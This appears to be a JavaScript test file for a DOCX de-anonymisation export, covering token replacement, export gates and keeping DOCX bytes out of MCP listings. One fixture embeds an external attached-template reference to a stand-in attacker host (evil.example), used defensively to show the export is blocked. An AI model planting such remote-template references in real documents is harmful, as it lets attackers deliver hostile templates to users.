// @vitest-environment jsdom
//
// DOCX-REBUILD §3.4 export integration: a DOCX outcome exports through the
// surgical reconstruction (bytes in → replaced bytes out), text outcomes
// keep the flat path, export gates surface as user-facing errors, and the
// docx payload never leaks into any MCP listing.
import { buildZip } from '../docx-rebuild/test-helpers/zip-fixture.js';
import { openZip } from '../docx-rebuild/zip-reader.js';
import { exportDeanonOutcomes } from './deanon.js';
import { buildOutcomeListing, buildReadOutcomeContent } from '../mcp/listings.js';

const XML_DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';
const W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';

function docxParts(docBody, extraParts = {}) {
  return {
    '[Content_Types].xml': `${XML_DECL}<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">`
      + '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
      + '<Default Extension="xml" ContentType="application/xml"/>'
      + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
      + '</Types>',
    '_rels/.rels': `${XML_DECL}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">`
      + '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
      + '</Relationships>',
    'word/document.xml': `${XML_DECL}<w:document xmlns:w="${W}"><w:body>${docBody}</w:body></w:document>`,
    ...extraParts,
  };
}

async function docxBytes(parts) {
  return buildZip(Object.entries(parts).map(([name, data]) => ({ name, data, method: 0 })));
}

const LEGEND = { '[PERSON_NAME_1]': 'Jan Kowalski' };

function docxOutcome(bytes, overrides = {}) {
  return {
    id: 'o1',
    label: 'pismo-od-AI.docx',
    mcpLabel: 'Wynik 1',
    text: 'Pozwany [PERSON_NAME_1] wnosi o oddalenie.',
    legendSnapshot: { ...LEGEND },
    docx: { bytes, inspection: { external: { hyperlinks: 0, blocked: [] } } },
    ...overrides,
  };
}

describe('exportDeanonOutcomes — DOCX outcomes go through the reconstruction', () => {
  it('replaces tokens inside the original bytes and returns the engine report', async () => {
    const bytes = await docxBytes(docxParts('<w:p><w:r><w:t>Pozwany [PERSON_NAME_1] wnosi.</w:t></w:r></w:p>'));
    const result = await exportDeanonOutcomes({ outcomes: [docxOutcome(bytes)], legend: LEGEND, format: 'docx' });

    expect(result.count).toBe(1);
    expect(result.fileName).toMatch(/-deanon\.docx$/);
    const rebuilt = openZip(new Uint8Array(await result.blob.arrayBuffer()));
    const doc = new TextDecoder().decode(await rebuilt.extract('word/document.xml'));
    expect(doc).toContain('Pozwany Jan Kowalski wnosi.');
    expect(result.reports[0].report.totals).toEqual({ replaced: 1, left: 0 });
  });

  it('blocks the export when the input carries non-hyperlink external references (§9.3)', async () => {
    const bytes = await docxBytes(docxParts('<w:p><w:r><w:t>[PERSON_NAME_1]</w:t></w:r></w:p>', {
      'word/_rels/settings.xml.rels': `${XML_DECL}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">`
        + '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/>'
        + '</Relationships>',
    }));
    await expect(exportDeanonOutcomes({ outcomes: [docxOutcome(bytes)], legend: LEGEND, format: 'docx' }))
      .rejects.toThrow(/odwołania zewnętrzne/);
  });

  it('blocks the export when no legend token is found in the file (§6.3, P-4)', async () => {
    const bytes = await docxBytes(docxParts('<w:p><w:r><w:t>Zero tokenów tutaj.</w:t></w:r></w:p>'));
    await expect(exportDeanonOutcomes({ outcomes: [docxOutcome(bytes)], legend: LEGEND, format: 'docx' }))
      .rejects.toThrow(/nie znaleziono żadnego tokenu/);
  });

  it('text outcomes still export flat, untouched by the DOCX path', async () => {
    const textOutcome = {
      id: 'o2', label: 'Wynik tekstowy', mcpLabel: 'Wynik 2',
      text: 'Czysty [PERSON_NAME_1].', legendSnapshot: { ...LEGEND },
    };
    const result = await exportDeanonOutcomes({ outcomes: [textOutcome], legend: LEGEND, format: 'docx' });
    expect(result.count).toBe(1);
    expect(result.reports).toBeUndefined();
  });
});

describe('MCP boundary — the docx payload never exists in any listing', () => {
  it('listings and reads expose text only, no bytes and no inspection', async () => {
    const bytes = await docxBytes(docxParts('<w:p><w:r><w:t>[PERSON_NAME_1]</w:t></w:r></w:p>'));
    const outcome = docxOutcome(bytes);
    const listing = JSON.stringify(buildOutcomeListing([outcome]));
    const read = JSON.stringify(buildReadOutcomeContent([outcome], 'o1'));
    for (const payload of [listing, read]) {
      expect(payload).not.toContain('bytes');
      expect(payload).not.toContain('inspection');
      expect(payload).not.toContain('docx"');
    }
    expect(JSON.parse(listing)[0]).toEqual({ id: 'o1', label: 'Wynik 1', char_count: outcome.text.length });
  });
});
